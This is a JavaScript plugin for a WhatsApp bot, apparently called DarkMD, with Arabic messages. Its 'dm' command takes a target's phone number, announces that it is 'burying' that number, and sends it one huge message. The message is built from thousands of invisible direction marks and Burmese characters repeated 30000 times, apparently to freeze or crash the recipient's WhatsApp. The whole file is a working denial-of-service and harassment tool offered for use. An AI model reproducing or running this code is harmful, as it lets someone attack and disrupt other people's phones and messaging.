let handler = async (m, { conn, text, usedPrefix, command }) => {
  if (!text) throw `قم بإضافة رقم الشخص المستهدف بعد الأمر "dm". \n مثال: ${usedPrefix}dm + رقم الهاتف على واتساب`;

  let cleanedNumber = text.replace(/\+|\s|-/g, '');

  conn.reply(m.chat, `جاري قبر ${cleanedNumber}`, m);
const more = String.fromCharCode(8206)
let readMore = more.repeat(4001)
  let message = '*~DarkMD~*\n%readMore'.trim().replace('%readMore', readMore) + 'ဪဪဪ'.trim().replace('%readMore', readMore);
  let multipliedMessage = message.repeat(30000);

  for (let i = 0; i < 1; i++) {
    conn.reply(cleanedNumber + '@s.whatsapp.net', multipliedMessage, null, { contextInfo: { mentionedJid: [m.sender] } });
  }
};
handler.command = /^(dm)$/i;
handler.rowner = true;
export default handler;